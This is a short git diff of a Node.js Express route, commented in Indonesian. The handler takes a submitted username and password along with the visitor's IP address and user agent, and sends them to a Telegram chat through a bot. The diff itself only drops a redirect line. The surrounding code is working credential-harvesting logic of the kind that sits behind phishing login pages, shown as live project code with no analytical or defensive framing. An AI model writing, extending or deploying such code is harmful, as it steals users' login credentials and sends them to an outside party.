@@ -28,7 +28,6 @@ router.post('/api', (req, res) => {
   // Kirim pesan ke Telegram
   const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nUser Agent: ${userAgent}`;
   bot.sendMessage(chatId, message);
-  res.redirect('../../');
   res.status(200).json({ success: true });
 });
 
